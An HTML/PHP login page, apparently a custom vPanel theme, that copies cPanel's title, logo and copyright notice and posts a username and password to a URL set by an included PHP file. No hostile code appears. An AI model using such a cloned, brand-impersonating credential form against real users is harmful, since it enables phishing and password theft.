<!-- This login form for vPanel has been created by VizuDev. More info at https://vizudev.cf/ -->

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google" content="notranslate" />
    <meta name="apple-itunes-app" content="app-id=1188352635" />
    <title>cPanel Login</title>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />

    <!-- EXTERNAL CSS -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700,700i" rel="stylesheet" type="text/css" />
    <link href="style.css" rel="stylesheet" type="text/css" />

    <style type="text/css">
/*
  This css is included in the base template in case the css cannot be loaded because of access restrictions
  If this css is updated, please update securitypolicy_header.html.tmpl as well
*/
.copyright {
  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
  background-size: 25px auto;
}
    </style>
    <!--[if IE 6]>
    <style type="text/css">
        img {
            behavior: url(cp_pngbehavior_login.htc);
        }
    </style>
    <![endif]-->

    <script>
    window.DOM = { get: function(id) { return document.getElementById(id) } };
    </script>
</head>
<body class="cp">




<input type="hidden" id="goto_uri" value="/?locale=en" />
<input type="hidden" id="goto_app" value="" />
<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[token_missing]  -->
<div id="login-wrapper" class="group has-pw-reset">
    <div class="wrapper">
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="notice-error.png" alt="Error" align="left"/>
                JavaScript is disabled in your browser.
                For cPanel to function properly, you must enable JavaScript.
                If you do not enable JavaScript, certain features in cPanel will not function correctly.
            </div>
            </noscript>
        
        
        <div id='login-status' class="error-notice" style="visibility: hidden">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class='login-status-icon'></span></div>
                    <div id="login-status-message">You have logged out.</div>
                </div>
            </div>
        </div>
    </div>


    <div id="content-container">
        <div id="login-container">

            <div id="login-sub-container">
                    <div id="login-sub-header">
                        
                        <img class="main-logo" src="logo.svg" alt="logo" />
                        
                    </div>
                    <div id="login-sub"
                                                >
                        <div id="clickthrough_form" style="visibility:hidden">

                        </div>
                        <div id="forms">
                            <form novalidate id="login_form" action="<?php include("urlhosting.php");?>login.php" method="post" style="visibility:">
                                <div class="input-req-login"><label for="user">Username</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="uname" id="user" autofocus="autofocus" placeholder="Enter your username." class="std_textbox" type="text"  tabindex="1" required>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="passwd" id="pass" placeholder="Enter your account password." class="std_textbox" type="password" tabindex="2"  required>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                    </div>

                                                                            <div class="reset-pw">
                                            
                                        </div>
                                                                    </div>
                                <div class="clear" id="push"></div>
                            </form>
                        <!--CLOSE forms -->
                        </div>
                    <!--CLOSE login-sub -->
                    </div>
                    

                                    <!--CLOSE wrapper -->
                </div>
            <!--CLOSE login-sub-container -->
            </div>
        <!--CLOSE login-container -->
        </div>
        

<!--Close login-wrapper -->
</div>
<script>
    var MESSAGES = {"network_error":"The login is invalid.","authenticating":"Authenticating …","no_username":"You must specify a username to log in.","session_locale":"The desired locale has been saved to your browser. To change the locale in this browser again, select another locale on this screen.","read_below":"Read the important information below.","invalid_login":"The login is invalid.","ajax_timeout":"The connection timed out. Please try again.","success":"Login successful. Redirecting …"};
    window.IS_LOGOUT = false;
</script>

<style>
    @media (min-width: 481px) {
        #select_user_form {
            width: px;
        }
    }
</style>
    <div class="copyright">Copyright© 2018 cPanel, Inc.
    <br /></div>

</body>

</html>